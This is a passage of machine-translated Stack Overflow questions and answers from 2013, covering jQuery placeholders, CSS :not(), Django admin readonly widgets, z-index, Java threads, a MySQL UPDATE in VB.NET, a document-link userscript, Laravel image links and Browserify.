> 时间：2013-02-12T13:24:41.027

我关注了：[http ://ryanbigg.com/2010/12/ubuntu-ruby-rvm-rails-and-you/](http://ryanbigg.com/2010/12/ubuntu-ruby-rvm-rails-and-you/)

它在第一次运行时就像一个魅力。尝试按照本博客中提到的步骤进行操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T14:16:25.407

我已经使用 rvm reinstall 1.9.3 安装了 ruby​​ 1.9.3，现在它可以正常工作了。

# jquery - 对象没有方法“占位符”

> ID：14832733
> 
> 赞同：2
> 
> 时间：2013-02-12T12:36:43.140
> 
> 标签：jquery, html, internet-explorer-9, placeholder

我正在使用[mathiasbynens / jquery-placeholder](http://mths.be/placeholder)在 IE9 中启用占位符。我按照自述文件中提到的简单步骤进行操作。

但我得到**Object [object Object] has no method 'placeholder'** in console at line`$('input, textarea').placeholder();`

任何想法是什么问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:37:50.640

尝试以常规、狡猾的方式设置属性：

```
$('input, textarea').attr('placeholder', 'value'); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:46:06.303

听起来 jquery-placeholder 没有正确包含在页面中。`placeholder()`在调用该方法之前，检查您的脚本标记中是否包含正确的 url 以及是否包含该脚本。

# html - 如何正确使用 CSS :not()？

> ID：14832738
> 
> 赞同：3
> 
> 时间：2013-02-12T12:36:56.393
> 
> 标签：html, css

我只是查找了[`:not()`](https://developer.mozilla.org/en/docs/CSS/%3anot)伪类并尝试了那里的示例。有趣的是，它在我的本地计算机上看起来与在 MDN 网站上不同。

比较[jsFiddle](http://jsfiddle.net/3Jqxr/)和[MDN 示例](https://developer.mozilla.org/en/docs/CSS/%3anot#Examples)。

```
p:not(.classy) { color: red; }
:not(p) { color: green; } 
```

```
<p>Some text.</p>
<p class="classy">Some other text.</p>
<span>One more text</span> 
```

输出：

> 一些文字。<-- 这是红色的。
> 
> 其他一些文字。<-- 这是绿色的？！（它应该是黑色或任何默认颜色）
> 
> 还有一个文本 <-- 这是绿色的。

在检查元素后，我发现它`Some other text`以某种方式从 . 继承了绿色`body`，而`:not(p)`.

那么为什么 MDN 站点显示正确呢？这是一个*技巧*：

```
<p style="color: red;">Some text.</p>
<p>Some other text.</p>
<p style="color: green;">One more text</p> 
```

所以我的问题是，如何`:not()` **正确**使用，防止继承造成意外结果？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-12T12:53:37.460

实际上，两者都是正确的。;) 在 jsFiddle 中，首先尝试定义默认颜色，例如

```
body { color: blue; } 
```

现在，body 没有特殊的颜色集，所以`:not(p)`也适用于 body，p.classy 继承了 body 的颜色。

有关更新的示例，请参见[http://jsfiddle.net/3Jqxr/1/](http://jsfiddle.net/3Jqxr/1/)。

编辑：由于`:not`选择器的特异性高于`body`CSS 中的简单选择器，因此您实际上必须设置默认颜色

```
body:not(p) 
```

对于这个例子。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T13:00:52.277

由于您没有为 设置默认值`<p>`，因此您的`<p class="classy">`元素继承自 body。您可能希望`<body>`从规则集中排除：

```
body :not(p) { color: green; } 
```

或者，您可以设置默认值：

```
p{ color: black; }
p:not(.classy) { color: red; }
:not(p) { color: green; } 
```

# django - django admin如何在只读字段上显示小部件

> ID：14832739
> 
> 赞同：11
> 
> 时间：2013-02-12T12:36:58.807
> 
> 标签：django, django-forms, django-admin, django-widget

当字段为只读时，我想在 django admin 的字段上显示我的小部件。

**管理员.py**

```
class AudioTrackAdminInline(admin.StackedInline):
    model = AudioTrack
    form = AudioTrackForm
    readonly_fields = ('file',) 
```

**表格.py**

```
class AudioTrackForm(forms.ModelForm):
    class Meta:
        model = AudioTrack
        widgets = { 'file': MediaFileInput, } # my widget 
```

当文件不是只读文件时，它会显示小部件 OK。但是当我将它包含为只读时，我会看到文本行。（如果只读，Django 不会使用我的表单）

即使在只读字段中，我怎样才能让它使用表单？

**或者**

如果我将我的字段设置为只读，如何显示另一个小部件？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-02-12T13:24:50.743

我会说这是一个功能。

当字段设置为只读时，Django 使用[`display_for_field`](https://github.com/django/django/blob/master/django/contrib/admin/utils.py#L358)硬编码结果的函数，您无法自定义它。

另一种方法是不将该字段设置为 readonly 和 override [`formfield_for_dbfield`](https://github.com/django/django/blob/master/django/contrib/admin/options.py#L87)，这是一种未记录的`ModelAdmin`方法，并根据您的需要采取行动。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2014-03-28T14:11:34.810

另一种更灵活的解决方案是设置要以只读模式呈现的那些字段的“禁用”属性，覆盖`get_form(...)`管理类的方法：

```
def get_form(self, *args, **kwargs):

    form = super(SupplierAdmin, self).get_form(*args, **kwargs)

    for field_name in self.fake_readonly_fields:
        form.base_fields[field_name].disabled = True

    return form 
```

请注意，我使用只读字段的名称不是来自通常的名称，`self.readonly_fields`而是来自我命名的不同数组，`self.fake_readonly_fields`以避免名称重叠

建议的解决方案（使用`formfield_for_dbfield`）的限制是，通过这种方式，您可以以相同的方式呈现给定类型的所有数据库字段，无论它是否应该是只读的。如果您的整个表单应该是只读的，那么这种方式就可以工作，但是如果您处理的是一半只读一半不是的表单，则最好依赖该`disabled`属性。

关于我的答案的更多详细信息：[django modeladmin, readonly_fields and boolean fields](https://stackoverflow.com/questions/22701035/django-modeladmin-readonly-fields-and-boolean-fields/22701663#22701663)

# html - 为什么 z-index 不起作用？

> ID：14832741
> 
> 赞同：0
> 
> 时间：2013-02-12T12:37:03.927
> 
> 标签：html, css

我有这个 HTML 代码：

```
<div id="logo">
    <div id="left-block">
        <h1>Title goes here</h1>
    </div>
</div>
<div id="right-block">
    <ul>
        <li>Menu1</li>
        <li>Menu2</li>
        <li>Menu3</li>
        <li>Menu4</li>
    </ul>
</div> 
```

它使用以下 CSS 代码在左上角显示标题，在右上角显示项目菜单：

```
#logo {
    position: absolute;
    z-index: 1;
}

#left-block {
    background-color: red;
    height: 50px;
}

#right-block {
    float: right;
    background-color: blue;
    height: 50px;
    z-index: 5;
}

ul {
    float: right;
    list-style: none;
}

li {
    display: inline;
    margin: 0 5px 0 0px;
} 
```

问题是当我有一个长标题时，如这个[Fiddle 示例所示](http://jsfiddle.net/nNkKT/)。标题与菜单重叠，z-index 似乎不起作用（我已将 z-index 放在任何地方但没有成功）。为什么 z-index 不起作用？是因为#logo 是绝对定位的吗？如何解决这个问题？

**注意**：我无法更改此 ( `#logo {position:absolute}`)，因为此简化演示中未显示的其他元素需要它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-12T12:40:59.960

只需手动设置`#right-block`位置：

```
#right-block {
    position: relative;
    float: right;
    background-color: blue;
    height: 50px;
    z-index: 5;
} 
```

z-index 仅适用于`absolute|relative|fixed`定位元素，默认值为 for `position`is `static`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:40:38.933

我认为你有一些 max `height`/ `width`，所以只需写一些 CSS 到`#logo`

```
#logo {
    position: absolute;
    z-index: 1;
    width: 100px; /* your maximum in width */
    height: 100px; /* your maximum in height */
    overflow: hidden; /* just to make sure there is nothing leaking your DIV */
} 
```

# java - 如何重用线程？线程什么时候关闭？

> ID：14832742
> 
> 赞同：0
> 
> 时间：2013-02-12T12:37:06.987
> 
> 标签：java, android, multithreading

我有这个代码：

```
 @Override
    public void onClick(View v) {
        if (!connected) {
            serverIpAddress = serverIp.getText().toString();
            if (!serverIpAddress.equals("")) {
                Thread cThread = new Thread(new ClientThread());
                cThread.start();                   
            }
        }
    }
};

private OnClickListener communicateListener = new OnClickListener() {

    @Override
    public void onClick(View v) {
        message = messageServer.getText().toString();
        if (!serverIpAddress.equals("")) {
            cThread.run();
            //Thread cThread = new Thread(new ClientThread());
            //cThread.start();
        }                  

    }
};

public class ClientThread implements Runnable {

    public void run() {           
          if (socket==null)
              connect to the server;
          else
              do smth else;
    } 
```

我想要的是 connectListener 来创建线程和线程来建立连接。然后，在单击communicateListener 时，应用程序将从套接字读取或写入。我不知道如何实现这一点。

我应该以某种方式在communicateListener的onclick方法中再次调用线程吗？或者它是否在持续运行并且当套接字不是空时它会“做其他事情”？

我尝试再次调用运行函数，但我得到了 NullPointerException。当我在communicateListener 中创建一个新线程时它工作得很好，但我不想每次单击按钮时都创建一个新线程。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-12T12:46:46.757

首先，永远不要调用线程的`run()`方法；这不会在新线程中运行代码，它会在您当前的线程中运行它。而是调用它的`start()`方法（以启动一个很快将在该`run()`方法处的新线程）。

当线程用完`run()`方法中的代码（或显式地从方法中返回）时，线程就结束了。该对象可能仍然存在，允许您从中提取数据（如果您想要任何东西），但是无法再次启动线程；您需要创建一个新实例并启动它。

如果您的意图是创建一次线程并让它在等待实际工作时“做其他事情”，您也可以这样做，但它与“在我需要工作时启动一个新线程”是不同的使用模型完毕”。两种使用模型都有自己的位置，但“当我需要它时启动”模型更易于实现，而且当它与 UI 操作相关时，更复杂的模型所提供的效率不太可能足以提升重要性。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T12:50:35.677

在我看来，您在尝试使用它们之前没有阅读任何文档，因为很明显您对 Java 中的线程一无所知。如果我在哪里，我会阅读以下章节：http: [//docs.oracle.com/javase/tutorial/essential/concurrency/](http://docs.oracle.com/javase/tutorial/essential/concurrency/)

但总而言之，要使线程工作：您调用“start()”，线程将自行启动，并调用“run()”函数。当 run() 函数结束时，线程死亡。

因此，如果您想再次执行相同的操作，请创建一个新的线程实例，然后重新启动它。

# mysql - 在 sql 语法中出现错误，vb.net 中的 mysql update 语句

> ID：14832746
> 
> 赞同：0
> 
> 时间：2013-02-12T12:37:12.150
> 
> 标签：mysql, vb.net

我在 vb.net 中尝试更新语句。我的代码在下面

```
'Connection statement
Dim con As New MySqlConnection("server =nnnnnnnnn; user =nnnnnnnnn; password= nnnnnnnnnnnnnn; database =nnnnn;")

'SQL query
Dim cmdText = "UPDATE contacts SET (title_name = @cotitle, contact_name = @coname, contact_mname = @comname, contact_pref_fname = @coprefname, contact_jobtitle = @cojobtitle, contact_job_sector = @cojobsector, contact_company = @coemp, contact_preflang = @colang, contact_home_nation = @cohomenat, contact_srequirements = @cosreqs, contact_street = @costreet, contact_town = @cotown, contact_postcode = @copcode, contact_resident_country = @cocountry, contact_email = @coemail, contact_phone = @cophone, contact_mobile = @comob, contact_notes = @conotes, contact_influence_level = @coinf, contact_optout_email = @cooptemail, contact_optout_phone = @cooptphone, contact_optout_post = @cooptpost WHERE contact_id = @coid);"

'commit SQL query with connection statement
Dim com As New MySqlCommand(cmdText, con)

'place fields into parameters for the query
com.Parameters.AddWithValue("@coid", contact_id.Text)
com.Parameters.AddWithValue("@cotitle", ComboBox1.Text)
com.Parameters.AddWithValue("@coname", TextBox3.Text)
com.Parameters.AddWithValue("@comname", TextBox4.Text)
com.Parameters.AddWithValue("@coprefname", TextBox1.Text)
com.Parameters.AddWithValue("@cojobtitle", TextBox2.Text)
com.Parameters.AddWithValue("@cojobsector", ComboBox7.Text)
com.Parameters.AddWithValue("@coemp", ComboBox8.Text)
com.Parameters.AddWithValue("@colang", ComboBox3.Text)
com.Parameters.AddWithValue("@cohomenat", ComboBox4.Text)
com.Parameters.AddWithValue("@cosreqs", RichTextBox2.Text)
com.Parameters.AddWithValue("@costreet", RichTextBox1.Text)
com.Parameters.AddWithValue("@cotown", TextBox8.Text)
com.Parameters.AddWithValue("@copcode", TextBox9.Text)
com.Parameters.AddWithValue("@cocountry", ComboBox5.Text)
com.Parameters.AddWithValue("@coemail", TextBox6.Text)
com.Parameters.AddWithValue("@cophone", TextBox10.Text)
com.Parameters.AddWithValue("@comob", TextBox12.Text)
com.Parameters.AddWithValue("@conotes", RichTextBox4.Text)
com.Parameters.AddWithValue("@coinf", ComboBox6.Text)
com.Parameters.AddWithValue("@cooptemail", CheckBox1.Checked)
com.Parameters.AddWithValue("@cooptphone", CheckBox2.Checked)
com.Parameters.AddWithValue("@cooptpost", CheckBox3.Checked)

'this will commit the record to the DB
con.Open()
com.ExecuteNonQuery()
con.Close() 
```

它说 SQL 语法错误，但我无法发现它。任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-12T12:39:33.697

删除语句中的括号

```
UPDATE contacts 
SET title_name = @cotitle, contact_name = @coname,.... 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-12T12:39:59.673

您的更新查询应该是这样的

`UPDATE contacts SET title_name = @cotitle, .....;"`

需要删除`(`和`)`

# javascript - 将图像放置到某些链接

> ID：14832747
> 
> 赞同：0
> 
> 时间：2013-02-12T12:37:12.390
> 
> 标签：javascript, html

我正在尝试编写 javascript 来转换页面上所有指向文档（PDF、DOC 等）的链接，以在链接左侧显示一个图标，该图标链接到该页面的 Google Docs 查看器。

为此，我使用了[这个 userscript](http://userscripts.org/scripts/show/127774)的来源。修改后的源码如下：

```
(function(){
var docLinks = document.links;
var fileTypes1 = ["doc","pdf","docx","xls","xlsx","ppt","pps","pptx","eps","ps","tif","tiff","ai","psd","pages","dxf","ttf","xps","odt","odp","rtf","csv","ods","wpd","sxi","sxc","sxw","zip","rar"];
var doCheck = true;
var dov_host =/(docs\.google\.com|sourceforge\.net|adf\.ly|mediafire\.com|springerlink\.com|ziddu\.com|ieee\.org|issuu\.com|asaha\.com|office\.live\.com|facebook\.com|[a-z]+\.wikipedia\.org)$/;

checkLinks();
setupListener();

function checkLinks()
{
    var supportedFileFormat=0;
    for (var i = 0; i < docLinks.length; ++i) 
    {
        supportedFileFormat=0;
        if (!((docLinks[i].host).match(dov_host)) && !docLinks[i].docView)
        {
            for (var i2 = 0; i2 < fileTypes1.length; i2++) {
                var url = stripQuery(docLinks[i]);
                url=url.toLowerCase();
                if (endsWith(url, '.' + fileTypes1[i2]))
                {
                    changeLink(docLinks[i], 1, fileTypes1[i2]);
                    break;
                }
            }
        }
        docLinks[i].docView=true;
    }
}

    function endsWith(str, suffix) 
{
    return str.indexOf(suffix, str.length - suffix.length) !== -1;
}

function changeLink(link, fileTypeCategory, fileExtension)
{
    var viewLink = document.createElement('a');
    if(fileTypeCategory)
    {
        viewLink.href = "https://docs.google.com/viewer?url="+encodeURI(link);
    }
    viewLink.title="View " + fileExtension.toUpperCase();
    var icon = document.createElement("img");
    if (fileExtension === "zip" || fileExtension === "rar")
    {
        icon.src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAapJREFUOMvVlT9u1EAUhz/bs/baqzWLIlAQEhWXoKBBKUPHEXIERIE4Aceg5QSIE6TiAKGgoiAIWG2w45l58yhMQogzxsufgteMNG/m937zvScN/G+RABy+fH4/pPoa1SJ2ME0zAEKQETFtFH1w79HTQwPQ2c2TxXJZzMsyeinL+5y37TCp/XLatlVzcvIMeJi8evF4YZwcr27eLtM0iQoX1QqA7uuXK/MKhBBYH79v/Sy7YWS92U/zuRMvpVwor5fczMoUAGvdKNvgg5Om2Te2aw/yRV1b6y6oXVIFlJ6x+y6sMc4mr+3m84Epl9f3dnbvkJdLTF5iiorM5D+1NwEWq1uQJNQ7u5wDSxIURewp4lq8bXFdg/huzxRVTVVlQAOuwdmPXPXYYt4Xaz8djY5YPoOiuoYREZwb54YqIn0HvBtHASAiGBF/fnhI9kd8ePcmOmZDYY8JUxzHHhJRDmeOnXeTnEwtJ+Ix4mWAIn5l2qb4M8fOMxnghOgdyzaOdaJwjPFWLIaJXzrW6f2KOfag+gdzsCVj/c1ivWMf3jbrzd2//DEd/bM/7xs/1vtqqeVVjgAAAABJRU5ErkJggg==";
    }
    else if (fileExtension === "xls" || fileExtension === "xlsx" || fileExtension === "ods" || fileExtension === "csv" || fileExtension === "sxc")
    {
        icon.src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAlhJREFUOMu9k8trE1EUxr/JLSadUGLpwug2iKAx4iJZZIyu/QOycNlVV4JZKAgm6couxBDcuHChFHcqBR810IXaMEk3aU1r6yugtT5hQsDUZKYzd66LJNM7eUwIiAeGuWfOOb85850zAtpWLBYZRjBCyAaAC5FIZLNfXOgcZFlm4XB4KJAxBkVR0Gw2Ua1WG4ZhzEiSdL87b4wvME0TqqoOhf+u13HY7wdjTFQU5U6hUDgajUbTA8GdezKZdASrqopsNgufzwdVVT2NRuOKLMs+SZIu9YBN0wRjzHrB1cvTAIC5G3cxN33Mgn74quCg6Mb4uAeEEGiaBsMwPABm8vn8aiwWm+/pmAfvaXULRne/Wee68gNThyax9egiBMGF2y+BeDwOr9froZTeAzDf03GnawC4eeuhBbv2YJcTYgKAAYC0pi8AgUAAuq6jVqsJfTXmO54933o++xxIp/fnsr62jNDpsyCkBU6lUhBFEW63G5VKBUPB5Y/f25EjKK++sgq2P21ZOYIg2IbqcrnQd3idCwCC/gkAwEIFCJ46Az6P9xcev4Cu6yCEWLWOHZvaHrpX0cnnax3XrbxTbUemsL62bBV8+fx2IHhgx/xWBCcPAACe/rRLwRiz+U8W8z21/08K/q1vfu3/IBuv85wU7/qC+cE7SyG2VmfxD3AiJNkgvP8sJztL0T08QdNHlmJgx5RSK7hZa2tM7FLsbL+3ATpNUUoHD4//nNAYbW0FA46fjNpAvJ9bWhkuBR+8zs5ZSZlMxgbOLa2MPjwASCQSGNUc97hUKuFf2V/eJ+rGq5ffUwAAAABJRU5ErkJggg==";
    }
    else if (fileExtension === "ppt" || fileExtension === "pps" || fileExtension === "pptx" ||  fileExtension === "odp" || fileExtension === "sxi")
    {
        icon.src = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAu5JREFUOMvdlM9PE1EQx7/z3tvXxbJtKaAXCSqYeNDERkyIEoN6MCJ6IQZjwsGDhoQYD95MPHrzygnCzb/AM+GgieGHeNAQU3+0FaEJWiE+fvQtu/s8uK2Utvjj6EsmeZud+ezMd2YW+G/P0NBQ9PrgwPif+lPpMjo6Oi6lFPUcgyCwVle/dTc3tzyr5+O6rhoZGbkLAGWQlLK/q6vrwB8kc6Tei7m5uc8AKsFKqdj8/DyIyPyLVMYYKKXipecyuLGx8XZnZ+eEMUYaYyCEgJQSQghwzsE5BxGBMQYiKt8BgDGGtbW1zdnZ2ZtVYNu2c47jmEQigWg0CpHPg7JZGKVAnANNTTAdHUBzM7TWUErBmJ/FJRIJAAhs285VgQEgmUyaGOegBw9AmczPEhmAgEAwABGCVArs/n1YlvVrAoiqpKkAExEKr19DZrNIRPch6PWACxJvFo9gPtsNs1HEwdkpnP7+Hetal+Mcx/k92LMs5FdXoY4W0HDZhetGEG35AJ7O4FFhEFd5E04Rwff9isbtCeacB62pFJYHBrC5NgWx/gZbfhHrGxq+TuJY8StSZ0+gIRaDEWJnHDjnQV2wMUZwznFyeBha34JSCnJ7A0mHcGXQwQ3HgRACrutWZLx72SrAvu8TANJaI5/PV/lvbysopWrOcDwer0pS7NA3VtJZSvlXy1GaCsZYQz2NKRKJoLW19a/AUsrS4sia4HQ6jba2tq2dXTbG+EQUGGPI87yIZVnF3WClFOVyOaumFFrr55lMpjsTLsbus7KycuDdx/TY2e6ea4wx7XneZg1Jlmt2clfHePhh0dt75lBTy/6HgrFeve0+fjnzamJpaWkDgAfAB2D2HJEQJkuWSh1vb2s/fA8E51NmcWxhYeFjz7meS/FYbKDo6qczL2aeFAqFdQBuaH49MAGIhGCrr7/vTuFL4eX09PR7AKz0z7dt25y/eK7fLfpvJycnp0Oo3pk57dFsFlbAw3sZHJofWlAr+Adp9B0P+gw3HwAAAABJRU5ErkJggg==";
    }
    else if (fileExtension === "tif" || fileExtension === "tiff" || fileExtension === "dxf")
    {
        icon.src = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAQtJREFUOMvVVUuOhSAQrIaOizmPB3DjjV270XgB995jRuiazWh8fvDpuHkkJECni6IoGuDTmlRV9e2cCySzp0BJmoqIK8vyy3sPkiA5BW+Pm6YJCgDOOeR5jizLoKrr3QEA4zgihHDKtq5rAIAuk4uiAEnEGOduZogxQkTm8V43MwzDMGPp8hje+xlEROCcA0mIyCHYcr6U4wU4hJBMPFpbA5PcAqcSzzbbZQzgbaCj+KkUd1jHGF9cpABgZhs33GH+r8s7c4WZpYGvOuLy5V2x30bjIykedUUKaB1/6+UBQN/3yQKjqvDeb2vvXwnYlaJt22Q5XM6P1ifLAoCStK7rwmM/h8jPRPiz2i+SVyUPSyFlKgAAAABJRU5ErkJggg==";
    }
    else if (fileExtension === "pdf")
    {
        icon.src = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAABCFJREFUOMuFlW2IVFUYx3/nvszMvXtn32YXDbUyA11bSd3R1toP4ZcyUQj6sJ+EygQLgiKCqC8RQkEUYRKICWYvsoH2Laks6D1fKsOVSGv9Erbtzs7s7MydmXvPSx9md2bHHenA4R4O9/x4zvP8/88RzI8/tq01C2sE7ZaNkdzxMOHGe0rxld/3bHj2hVNtfmmeGx9ea2478BZYAmG14owxoA04LqmNWa5MXCOdyTD9z3XM2W+PbHrymSduBDsLC6kFQmhKn3yIcGyEZTWgRipwU3Tuf554ZhrGL9KxYxdRb4bclpG9F44dGdy85/F7hRCNW1uLwRiN7adwAg8n7eN0duAEHu7yZXQ+/SKiq4fCO69j9WbwfZ8gCAiCAL3+7uELHxwfHxsbs9uAQRiNnUpg+ynctI+b9kisXoP32HMQpCm/+wZxIcf1ag3HcUin0wRBgOu6mLUDA7cLPluaCiMwSoJlIWwL4bqIwa0wtB2jJKXjB5ma+JNCKUQ6LidPngQgvHyJuXM/sWZ4G5ns1u3nz5/3s9ls2ADHGkwUYWKJzvRj3b8bvepOwulJZk4cZu7aBLIaYbSgb+Uq+ubPVacnmQ1LpIRF6bUDJF551V5SvHLQTem+nZg71hHFMbVzPxB/OobO59GxxEQS46bqKlkYiSTCGPq9FH9PzzAyMjK3JBWV1eso5HIwk0P9/CPq3DdoGYPUGCXRsUJ0dKG1bkoxkcBog4qiFtU7i4snJ69TPXMaffkiplJZOIpRGqM1RoOFaI3YTWC0xoljYi3a67jyxWmi779eajcDRps6UNgtYLunh27LwVcaqWkfsT88gjN+iSg3tZgJxmDm4ZawcV2XZDKJ53n4t65iyvMolst1L9wIjo0gM7SFzoH1lN87SvTd12hj0Kbha4QxJHozdK5Y0XKhSm8fUSlEmia4xXm1X39BhRW8R/eR3P0IJtYIqRFS1QsYa4ztorVuzCiKmOnuwVRrxDdLxdyJj6hNTOCPjpLauQttWZTfP95sRAa0pkUVk5OTiP5lBFevonS7iI1AhVVkqUzxyFGKh94m8cAOkg/tQkUSFan6V6p6YzKGYrFIGIZkBtZhVWPiRWJp6RWyXKkDYkn58zPMHTuGNzqKsynbhMcSrTVSSnK5HLZt0ze0GVWttRTPalpaIMPqougUcx+fIvzyK4Kn9kNPpg41Aq01+XyeKIro7u6GZJJ42fL2YKkhLoXNK8/P/JsHUbNF0vv2oiKFcV2UUhQKBZLJJL7v1/M/eFeLjltyXC5XqcSKaqSozc9KqcrUocO42c2owQ1UYs3s7CxKKbq6uhrq6MhuIjY3cd7UXA3LSi4x3szZ3wiu/oW380HyFy8TFYt4nkcq1WxIqZW3tETcYLzcP2RaNv7nQW37cAIv/XtBAPwHt7pWqMK3XG0AAAAASUVORK5CYII=";
    }
    else
    {
        icon.src = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAxJJREFUOMu1lT1rI1cUhp/51jjyDpGyxCxGYHATcGPjJrYhdpkulf9E2vyB/IN0IVvmJ2yR3sRR5WIJhDWGLbwYBYQtxfpAM/fjnBSylBh5vKTIhYHLcN9zn3nfc+/A/zSCxeT3N6+/SoixzeakWt8aPieaTCYfTk5O3EcL//Hm9df58P0v8fq6+vWXdvz5l9M6gXMuNcbceu+/OTw8fFu3LgYQJ3nYyPTTrXagzU762cZWWicYDod47z/p9/u/drvdbw8ODn5+al0I4I1BrUPtBDFjvPe1j3OOdrtNq9VqRlH0Y7fb/a6W2HsPzoEqqgqqXF1d0ev1aLfb3N3dkWUZcRwzGAw4PT2lLEuMMWvT6fT78/Pz8dHR0U8rxHiPOoeqLIsnSUKe56RpSp7nNBoNsixDVel2uwwGA0SEKIrWgB/Ozs6+WCHGe8RY1FRIalER+v0+o9GI0Wj06BOjKKLX6zEcDul0OjSbTYwxgTFmF3j32IrKoMYgVYU2HKpKp9NhPB4DkGUZzjnieM6hqqRpyosXL1hbW2M8HrvZbMaTxFpZpCoRa0GVy8tLnKtv1ePjYwBEhCRJ5jmtFgaxc2JxjkCV3d1drLXEcYwx5rEojuchPwwRqesKh5p/iIN5KMtFeZ6viMuyJAxD0jRFRJ4m9sYglUGqEn1ou4uLi2etWGy4v7//iH7FYyqDlBFqLaEq29vbTCYT8jxnNpsRRRFhGGKtJcsykiSh3W6jqvXEeD8/eQ/EqsrNzQ2TyYQoilZEAM1mk1artfBYa4nVWigVjENE2NnZ+ejVKCIEQYCIrGQwL+zm7RaUHpxHVLm+vub29haAoii4v79/JCyKgjzP2dzcRFVrwvMeTEUwCxHrlkc6yzKAR/PFSJKEKIrQxf3ytBUgxhKWIM6jqgwGA6bT+bU8nU5XvC7Lkr29vSVtbXhSWagA4xERNjY2loWDICDLMqy1y85oNBpLX2uJvalQYwlLIXjoiqIoKIri2fAWBWs9Ni9fvXe//RVc38dY907+fPXW/Jcfp4g0gyC4/fe7vwHKzB9BstqVUgAAAABJRU5ErkJggg==";
    }
    icon.style.marginLeft = "3px";
    viewLink.appendChild(icon);
    viewLink.setAttribute("target", "_blank");
    link.parentNode.insertBefore(viewLink, link.nextSibling);
}

function setupListener()
{
    document.addEventListener('DOMNodeInserted',function(e)
    {
        if (doCheck)
        {
            doCheck = false;
            setTimeout(function(){checkLinks();doCheck = true;}, 1000);
        } 
  },false);
}

})(); 
```

但是，此脚本将图标添加到链接的右侧，而不是左侧。有什么办法可以做到这一点吗？

提前致谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T12:56:57.193

尝试使用`ViewLink.prepend(icon)`而不是`ViewLink.appendChild(icon)`

编辑：`viewLink.title="View " + fileExtension.toUpperCase();`放在函数中的 `ViewLink.appendChild(icon) 下方。

# html - 将图像链接到 Laravel 中的路线

> ID：14832753
> 
> 赞同：2
> 
> 时间：2013-02-12T12:37:33.013
> 
> 标签：html, routes, hyperlink, laravel, helpers

我正在研究 laravel php 框架，我有一个简单的问题，在使用刀片模板引擎时，我通常使用 html 辅助函数来呈现表单、链接或其他任何东西。

现在，当我尝试添加指向特定路线的链接时，我通常会喜欢这样：

```
{{ HTML::link_to_route('author','TheAuthor')) }} 
```

第一个参数采用路线，第二个参数采用将出现的字符串，为了使代码生成更简单：

```
<a href="ROUTE URL">TheAuthor</a> 
```

现在我想用图像替换 TheAuthor，我该怎么办？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-05-12T19:54:12.427

或者你可以使用 {{route}}

前任：

```

`<a href="{{route($route,$params)}}"><img src="'.$image.'" /></a>` 

            回答 #2

赞同：3

时间：2013-02-12T13:17:02.410

我知道这不是您想听到的答案 - 但您不能通过 link_to_route 传递任何图像。

问题是 HTML 类的输出会自动转义。所以如果你试图通过这个：

```
{{ HTML::link_to_route('author','<img src="'.URL::base().'assets/images/image.jpg" alt="icon" />')) }} 
```

结果是这样的：

```
&lt;img src=&quot;http://laravel3.dev/assets/images/image.jpg&quot; alt=&quot;icon&quot; /&gt; 
```

这将只是屏幕上的文本 - 没有图像。相反，您需要自己使用`URI::to_route('author')`和生成链接。所以做一个这样的助手（未经测试）：

```
function link_to_route_image($route, $image)
{
   $m = '<a href="'.URL::to_route($route).'">'
      . '<img>'.$image.'</img>'
      . '</a>';
   return $m;
} 
```

            回答 #3

赞同：1

时间：2014-01-29T09:56:33.247

如果你在所有地方都这样做可能会变得乏味，但在孤立的地方，处理这个问题的最佳方法实际上是将你的整个 link_to_* 方法调用包装在 HTML::decode 中。

```
{{ HTML::decode(HTML::link_to_route('author','<img src="{URL::base()}assets/images/image.jpg" alt="icon" />')) }} 
```

您无法从函数内部执行任何操作（例如在解码中包装“标题”部分），因为清理是在函数调用中进行的，但如果您解码整个链接，它将正确呈现 html。

```

# javascript - Browserify - 找不到变量：需要

> ID：14832754
> 
> 赞同：4
> 
> 时间：2013-02-12T12:37:36.790
> 
> 标签：javascript, node.js, browserify

我正在使用客户端上需要的几个 node.js 模块：

index.js：

```
var sync = require('../lib/sync'); 
```

所以我认为 browserify 可能是最好的选择。捆绑文件效果很好，但是，bro​​wserify 将`(function(){my code here})();`导致`Can't find variable: require`错误的所有内容包装在 a 中。我怎样才能防止这种行为？

当我移除包装时，一切都按预期工作，没有错误。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-13T00:48:46.947

我用“--exports require”运行browserify，这是你需要的吗？

```
browserify entry.js --exports require -o br.js 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-12T12:42:39.497

您可以像这样将参数传递给[IIFE](http://benalman.com/news/2010/11/immediately-invoked-function-expression/)：

```
(function (require) {
